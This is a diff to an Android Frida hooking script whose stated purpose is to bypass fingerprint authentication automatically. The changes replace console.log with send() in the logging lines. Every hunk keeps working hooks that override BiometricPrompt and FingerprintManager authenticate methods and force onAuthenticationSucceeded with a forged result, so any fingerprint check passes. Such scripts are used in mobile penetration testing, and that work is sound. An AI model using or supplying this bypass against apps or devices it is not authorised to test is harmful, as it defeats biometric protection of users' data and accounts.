@@ -3,18 +3,18 @@
     This script should automatically bypass fingerprint when authenticate(...) method will be called.
 */
 
-console.log("Fingerprint hooks loaded!");
+send("Fingerprint hooks loaded!");
 
 Java.perform(function () {
     //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
     try { hookBiometricPrompt_authenticate(); }
-    catch (error) { console.log("hookBiometricPrompt_authenticate not supported on this android version") }
+    catch (error) { send("hookBiometricPrompt_authenticate not supported on this android version") }
     try { hookBiometricPrompt_authenticate2(); }
-    catch (error) { console.log("hookBiometricPrompt_authenticate not supported on this android version") }
+    catch (error) { send("hookBiometricPrompt_authenticate not supported on this android version") }
     try { hookFingerprintManagerCompat_authenticate(); }
-    catch (error) { console.log("hookFingerprintManagerCompat_authenticate failed"); }
+    catch (error) { send("hookFingerprintManagerCompat_authenticate failed"); }
     try { hookFingerprintManager_authenticate(); }
-    catch (error) { console.log("hookFingerprintManager_authenticate failed"); }
+    catch (error) { send("hookFingerprintManager_authenticate failed"); }
 });
 
 
@@ -42,7 +42,7 @@ function getAuthResult(resultObj, cryptoInst) {
             }
         }
     }
-    console.log("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
+    send("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
     return authenticationResultInst;
 }
 
@@ -57,9 +57,9 @@ function getBiometricPromptAuthResult() {
 
 function hookBiometricPrompt_authenticate() {
     var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
-    console.log("Hooking BiometricPrompt.authenticate()...");
+    send("Hooking BiometricPrompt.authenticate()...");
     biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
-        console.log("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
+        send("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
         var authenticationResultInst = getBiometricPromptAuthResult();
         callback.onAuthenticationSucceeded(authenticationResultInst);
     }
@@ -67,9 +67,9 @@ function hookBiometricPrompt_authenticate() {
 
 function hookBiometricPrompt_authenticate2() {
     var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
-    console.log("Hooking BiometricPrompt.authenticate2()...");
+    send("Hooking BiometricPrompt.authenticate2()...");
     biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {
-        console.log("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto + ", cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
+        send("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto + ", cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
         var authenticationResultInst = getBiometricPromptAuthResult();
         callback.onAuthenticationSucceeded(authenticationResultInst);
     }
@@ -97,17 +97,17 @@ function hookFingerprintManagerCompat_authenticate() {
             authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
         }
         catch (error) {
-            console.log("FingerprintManagerCompat class not found!");
+            send("FingerprintManagerCompat class not found!");
             return
         }
     }
-    console.log("Hooking FingerprintManagerCompat.authenticate()...");
+    send("Hooking FingerprintManagerCompat.authenticate()...");
     var fingerprintManagerCompat_authenticate = fingerprintManagerCompat['authenticate'];
     fingerprintManagerCompat_authenticate.implementation = function (crypto, flags, cancel, callback, handler) {
-        console.log("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
-        //console.log(enumMethods(callback.$className));
+        send("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
+        //send(enumMethods(callback.$className));
         callback['onAuthenticationFailed'].implementation = function () {
-            console.log("[onAuthenticationFailed()]:");
+            send("[onAuthenticationFailed()]:");
             var sweet_cipher = null;
             var cryptoInst = cryptoObj.$new(sweet_cipher);
             var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
@@ -144,15 +144,15 @@ Error: authenticate(): has more than one overload, use .overload(<signature>) to
             authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$AuthenticationResult');
         }
         catch (error) {
-            console.log("FingerprintManager class not found!");
+            send("FingerprintManager class not found!");
             return
         }
     }
-    console.log("Hooking FingerprintManager.authenticate()...");
+    send("Hooking FingerprintManager.authenticate()...");
 
     var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
     fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
-        console.log("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
+        send("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
         var sweet_cipher = null;
         var cryptoInst = cryptoObj.$new(sweet_cipher);
         var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
